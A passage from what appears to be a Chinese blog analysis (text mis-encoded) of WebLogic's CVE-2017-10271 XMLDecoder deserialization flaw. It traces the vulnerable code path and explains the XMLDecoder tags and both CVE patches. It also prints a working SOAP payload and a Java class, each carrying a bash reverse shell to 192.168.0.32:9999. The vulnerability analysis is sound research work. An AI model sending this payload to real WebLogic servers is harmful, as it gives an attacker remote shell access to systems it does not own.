class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var4.toByteArray()));</span><br><span class="line">        <span class="built_in">this</span>.receive(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥processRequestä¸­æˆ‘ä»¬åªæŠŠå¤´è¯»äº†è¿›æ¥ï¼Œå…¶ä»–çš„æ•°æ®è¿˜åœ¨ç¼“å†²åŒºä¸­ï¼Œä½¿ç”¨ByteArrayOutputStreamå‡½æ•°è¯»å–å‰©ä½™æ•°æ®åˆ°var4ã€‚ç»è¿‡ä¸€ç³»åˆ—çš„å¤„ç†åï¼Œå¦‚æœæ²¡æœ‰é—®é¢˜å°±åˆ›å»ºWorkContextXmlInputAdapterå¯¹è±¡ var6ï¼Œä¹‹åè·Ÿè¿›receive()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">receive</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">WorkContextMapInterceptor</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">    var2.receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›receiveRequest()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    ((WorkContextMapInterceptor)<span class="built_in">this</span>.getMap()).receiveRequest(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†var1ä¼ åˆ°äº†receiveRequest()æ–¹æ³•ä¸­ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">receiveRequest</span><span class="params">(WorkContextInput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WorkContextEntry</span> <span class="variable">var2</span> <span class="operator">=</span> WorkContextEntryImpl.readEntry(var1);</span><br><span class="line">            <span class="keyword">if</span> (var2 == WorkContextEntry.NULL_CONTEXT) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">            <span class="built_in">this</span>.map.put(var3, var2);</span><br><span class="line">            <span class="keyword">if</span> (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(<span class="string">&quot;receiveRequest(&quot;</span> + var2.toString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;</span><br><span class="line">            <span class="keyword">if</span> (debugWorkContext.isDebugEnabled()) &#123;</span><br><span class="line">                debugWorkContext.debug(<span class="string">&quot;receiveRequest : &quot;</span>, var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿› readEntry </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> WorkContextEntry <span class="title function_">readEntry</span><span class="params">(WorkContextInput var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var1</span> <span class="operator">=</span> var0.readUTF();</span><br><span class="line">    <span class="keyword">return</span> (WorkContextEntry)(var1.length() == <span class="number">0</span> ? NULL_CONTEXT : <span class="keyword">new</span> <span class="title class_">WorkContextEntryImpl</span>(var1, var0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¯¹var0æ‰§è¡Œäº†readUTF()æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">readUTF</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">return</span> (String)<span class="built_in">this</span>.xmlDecoder.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œäº†readObject()æ–¹æ³•ï¼Œå¯¹XMLDecoderå¯¹è±¡è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://www.anquanke.com/post/id/102768">https://www.anquanke.com/post/id/102768</a></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¯¦ç»†å‰–æä¸‹payloadçš„åŸç†</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                /bin/bash</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                -c</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">                                bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ SOAP è¯·æ±‚æˆ–è€…æ›´å…·ä½“åœ°ä¸ºä»€ä¹ˆåœ¨ WebLogic ä¸­ä½¿ç”¨ SOAPï¼Œå…³è”åˆ°äº†å‡ ä¸ªé‡è¦çš„ç‚¹ï¼šWebæœåŠ¡çš„æ ‡å‡†ã€WebLogic æœåŠ¡å™¨çš„åŠŸèƒ½ä»¥åŠä¼ä¸šçº§åº”ç”¨çš„éœ€è¦ã€‚ä¸‹é¢æ˜¯è¿™äº›å…³ç³»çš„è¯¦ç»†è§£é‡Šï¼š</p><ol><li><strong>SOAP å’Œ Web æœåŠ¡æ ‡å‡†</strong><br>SOAPï¼ˆSimple Object Access Protocolï¼‰æ˜¯ä¸€ç§åè®®è§„èŒƒï¼Œç”¨äºåœ¨ç½‘ç»œä¸Šäº¤æ¢ç»“æ„åŒ–ä¿¡æ¯ï¼Œå®ƒå»ºç«‹åœ¨ XML åè®®ä¹‹ä¸Šï¼Œä½¿å…¶èƒ½å¤Ÿä¸ä»»ä½•ç³»ç»Ÿçš„ä»»ä½•ç¼–ç¨‹è¯­è¨€è¿›è¡Œäº¤äº’ï¼Œè¿™å¯¹äºå¼‚æ„ç³»ç»Ÿçš„é›†æˆéå¸¸é‡è¦ã€‚SOAP å®šä¹‰äº†å¦‚ä½•é€šè¿‡ç½‘ç»œä¼ è¾“ä¿¡æ¯ï¼š</li></ol><ul><li><strong>ç‹¬ç«‹äºå¹³å°å’Œè¯­è¨€</strong>ï¼šSOAP æä¾›äº†ä¸€ç§æ–¹å¼ï¼Œå…è®¸ä¸åŒæ“ä½œç³»ç»Ÿå’Œç¼–ç¨‹è¯­è¨€ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œè¿™å¯¹äºå¤šç§æŠ€æœ¯å †æ ˆçš„ä¼ä¸šç¯å¢ƒè‡³å…³é‡è¦ã€‚</li><li><strong>æ”¯æŒå¤æ‚çš„äº¤äº’æ¨¡å¼</strong>ï¼šä¸ç®€å•çš„ REST ç›¸æ¯”ï¼ŒSOAP æ”¯æŒæ›´å¤æ‚çš„äº¤äº’å’Œæ›´å¼ºçš„å®‰å…¨æ€§ï¼ŒåŒ…æ‹¬äº‹åŠ¡ç®¡ç†å’ŒåŒå‘æ“ä½œã€‚</li></ul><ol start="2"><li><strong>WebLogic æœåŠ¡å™¨å’Œ Web æœåŠ¡</strong><br>WebLogic æ˜¯ Oracle çš„ä¸€ä¸ªä¼ä¸šçº§åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒæä¾›äº†å…¨é¢çš„æ”¯æŒç”¨äºå¼€å‘ã€é›†æˆå’Œéƒ¨ç½²ä¼ä¸šçº§çš„ Java EE åº”ç”¨ã€‚WebLogic æœåŠ¡å™¨æä¾›çš„ç‰¹æ€§ä¹‹ä¸€å°±æ˜¯å¯¹ Web æœåŠ¡çš„ä¼˜ç§€æ”¯æŒï¼ŒåŒ…æ‹¬ï¼š</li></ol><ul><li><strong>SOAP æ”¯æŒ</strong>ï¼šWebLogic æä¾›å¯¹ SOAP Web æœåŠ¡çš„åŸç”Ÿæ”¯æŒã€‚å®ƒèƒ½å¤Ÿæ‰¿è½½ä½¿ç”¨ SOAP åè®®çš„æœåŠ¡ï¼Œå¤„ç† SOAP æ¶ˆæ¯ï¼Œå¹¶è¿›è¡Œå¿…è¦çš„å®‰å…¨å’Œäº‹åŠ¡å¤„ç†ã€‚</li><li><strong>WS-Security</strong>ï¼šSOAP çš„å®‰å…¨æ‰©å±•ï¼ˆWS-Securityï¼‰æä¾›äº†ä¸€ç§æœºåˆ¶æ¥ä¿è¯ SOAP æ¶ˆæ¯çš„å®‰å…¨ï¼Œè¿™æ˜¯ä¼ä¸šçº§åº”ç”¨æ‰€éœ€çš„ã€‚WebLogic æ”¯æŒè¿™äº›æ ‡å‡†ï¼Œç¡®ä¿æ•°æ®ä¼ è¾“çš„å®‰å…¨æ€§ã€‚</li></ul><ol start="3"><li><strong>ä¼ä¸šçº§åº”ç”¨çš„éœ€è¦</strong><br>åœ¨ä¼ä¸šçº§åº”ç”¨ä¸­ï¼Œå¸¸å¸¸éœ€è¦ä¿è¯æ•°æ®çš„å®‰å…¨ä¼ è¾“å’Œå¯é æ€§ï¼š</li></ol><ul><li><strong>å¯é æ€§å’Œäº‹åŠ¡æ€§</strong>ï¼šä¼ä¸šçº§åº”ç”¨é€šå¸¸è¦æ±‚æ•°æ®ä¼ è¾“å¿…é¡»æ˜¯å¯é çš„å’Œå…·å¤‡äº‹åŠ¡æ€§çš„ï¼ŒSOAP æä¾›äº† WS-ReliableMessaging å’Œ WS-AtomicTransaction ç­‰è§„èŒƒæ”¯æŒï¼Œè¿™äº›éƒ½æ˜¯ REST å¾ˆéš¾å®Œæ•´æä¾›çš„ã€‚</li><li><strong>æœåŠ¡æè¿°</strong>ï¼šSOAP ä½¿ç”¨ WSDL (Web Services Description Language) æè¿°æœåŠ¡æ¥å£ï¼Œè¿™å¯¹äºä¼ä¸šçº§æœåŠ¡çš„è‡ªåŠ¨å‘ç°å’Œé›†æˆéå¸¸é‡è¦ã€‚</li></ul><ol start="4"><li><strong>WebLogic ä¸­çš„ SOAP åˆ©ç”¨æ¼æ´</strong><br>æ­£å› ä¸º WebLogic æœåŠ¡å™¨å¹¿æ³›åœ°æ”¯æŒä½¿ç”¨ SOAP è¿›è¡Œå¤æ‚çš„ Web æœåŠ¡äº¤äº’ï¼Œæ‰€ä»¥ä¸€æ—¦è¿™äº›å¤„ç†æœºåˆ¶ä¸­å­˜åœ¨ç¼ºé™·ï¼Œå®ƒä»¬å°±æˆä¸ºäº†æ”»å‡»è€…çš„ç›®æ ‡ã€‚ä¾‹å¦‚ï¼ŒCVE-2017-10271 å°±æ˜¯åˆ©ç”¨äº† WebLogic åœ¨è§£æ SOAP è¯·æ±‚æ—¶å¤„ç† XML è¾“å…¥çš„æ–¹å¼ä¸­çš„æ¼æ´ã€‚</li></ol><p>ProcessBuilderæ˜¯ä»€ä¹ˆ? ï¼ŒProcessBuilderç±»æ˜¯J2SE1.5åœ¨java.langä¸­æ–°æ·»åŠ çš„ä¸€ä¸ªæ–°ç±»ï¼Œæ­¤ç±»ç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œå®ƒæä¾›ä¸€ç§å¯åŠ¨å’Œç®¡ç†è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºï¼‰çš„æ–¹æ³•ã€‚è¯´ç™½äº†å®ƒèƒ½æ‰§è¡Œæœ¬åœ°å‘½ä»¤ï¼Œä½†æ˜¯å®ƒæä¾›çš„åŠŸèƒ½æ›´åŠ ä¸°å¯Œ,èƒ½å¤Ÿè®¾ç½®å·¥ä½œç›®å½•ã€ç¯å¢ƒå˜é‡ã€‚<br>å°†ä¸Šé¢çš„payloadè½¬åŒ–ä¸ºjavaä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»º ProcessBuilder å®ä¾‹</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(commands);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¯åŠ¨è¿›ç¨‹</span></span><br><span class="line">            processBuilder.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                <span class="keyword">if</span> (qName.equalsIgnoreCase(â€œobjectâ€)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> newIllegalStateException(â€œInvalid context type: objectâ€);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(â€œParser Exceptionâ€, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(â€œParser Exceptionâ€, var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(â€œParser Exceptionâ€, var7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªæ˜¯CVE-2017-3506çš„è¡¥ä¸ï¼Œå†å¯¹xmlè§£ææ—¶ï¼Œå¦‚æœqNameçš„å€¼æ˜¯Objectæ—¶å°†æŠ›å‡ºå¼‚å¸¸ï¼Œé‡‡ç”¨çš„é»‘åå•çš„æ–¹å¼ã€‚æ‰€ä»¥å°±å‡ºç°äº†ä»Šå¤©çš„åˆ†æçš„CVE-2017-10271ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, StringlocalName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">        <span class="keyword">if</span> (qName.equalsIgnoreCase(â€œobjectâ€)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(â€œInvalid element qName: objectâ€);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(â€œ<span class="keyword">new</span>â€)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(â€œInvalid element qName: <span class="keyword">new</span>â€);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(â€œmethodâ€)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> newIllegalStateException(â€œInvalid element qName: methodâ€);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (qName.equalsIgnoreCase(â€œ<span class="keyword">void</span>â€)) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!â€indexâ€.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> newIllegalStateException(â€œInvalid attribute</span><br><span class="line">                            <span class="keyword">for</span> element <span class="keyword">void</span>: â€+attributes.getQName(attClass));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯CVE-2017-10271è¡¥ä¸ï¼Œåˆ†åˆ«å¯¹ Object new method voidè¿›è¡Œäº†åˆ¤æ–­,è¿›è¡Œäº†é˜²æŠ¤ã€‚å¯¼è‡´pocæ”»å‡»å¤±æ•ˆã€‚</p><h2 id="æ¼æ´æ ¹æº"><a href="#æ¼æ´æ ¹æº" class="headerlink" title="æ¼æ´æ ¹æº"></a>æ¼æ´æ ¹æº</h2><p>å…¶å®ä¸»è¦è¿˜æ˜¯ XMLDecoder çš„é—®é¢˜ï¼Œ<code>XMLDecoder</code> æ˜¯ Java Beans ä¸­ç”¨äºä» XML æ–‡æ¡£ä¸­æ¢å¤ Java å¯¹è±¡å›¾çš„ä¸€ä¸ªå·¥å…·ã€‚å®ƒæ˜¯ä¸“ä¸ºè§£ç é€šè¿‡ <code>XMLEncoder</code> ç¼–ç çš„ XML æ–‡æ¡£è€Œè®¾è®¡çš„ï¼Œä½†ä¹Ÿå¯ç”¨äºå¤„ç†å…¶ä»–ç¬¦åˆæ ¼å¼çš„ XMLã€‚<code>XMLDecoder</code> ä¸»è¦å¤„ç†ä»¥ä¸‹å‡ ç§ç±»å‹çš„æ ‡ç­¾ï¼š</p><ol><li><code>&lt;object&gt;</code><br>è¿™ä¸ªæ ‡ç­¾ç”¨äºåˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹ã€‚å®ƒé€šå¸¸åŒ…å« <code>class</code> å±æ€§æ¥æŒ‡å®šè¦å®ä¾‹åŒ–çš„ç±»ã€‚è¿™æ˜¯æœ€åŸºæœ¬çš„ç”¨äºå®ä¾‹åŒ–å¯¹è±¡çš„æ ‡ç­¾ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Date&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;java&gt;</code><br>è¿™ä¸ªæ ‡ç­¾æ˜¯ç”¨äºå°è£…æ•´ä¸ª Java å¯¹è±¡åºåˆ—åŒ–æ•°æ®çš„æ ¹å…ƒç´ ï¼Œæä¾›äº†ä¸€ä¸ªç¯å¢ƒæ¥æŒ‡å®š Java ç‰ˆæœ¬å’Œç±»å®šä¹‰ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;array&gt;</code><br>ç”¨äºè¡¨ç¤ºä¸€ä¸ªæ•°ç»„ï¼Œé€šå¸¸åŒ…å« <code>class</code> å’Œ <code>length</code> å±æ€§ï¼Œç”¨äºæŒ‡å®šæ•°ç»„çš„å…ƒç´ ç±»å‹åŠé•¿åº¦ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;void&gt;</code><br>è¿™æ˜¯ä¸€ä¸ªå¤šåŠŸèƒ½çš„æ ‡ç­¾ï¼Œç”¨äºè¡¨ç¤ºä¸è¿”å›å€¼çš„æ–¹æ³•è°ƒç”¨æˆ–å±æ€§è®¾ç½®ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ç”¨äºè°ƒç”¨æ–¹æ³•æˆ–è®¾ç½®å¯¹è±¡çš„å±æ€§ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>John Doe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Integer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>100<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 